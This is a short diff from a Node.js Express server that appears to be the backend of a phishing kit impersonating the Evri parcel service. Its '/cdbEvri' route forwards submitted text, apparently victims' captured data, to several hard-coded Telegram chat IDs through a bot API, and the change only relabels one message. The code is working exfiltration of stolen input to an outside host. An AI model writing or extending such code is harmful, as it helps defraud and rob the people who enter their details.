@@ -3516,7 +3516,7 @@ app.post("/cdbEvri", (req, res) => {
         F_zn66 = 0;
       } else {
         axios.post(
-          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=EvriFlash:\n${originalText}`
+          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=EvriCDG:\n${originalText}`
         );
         axios.post(
           `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=911916233&text=Evri:\n${originalText}`
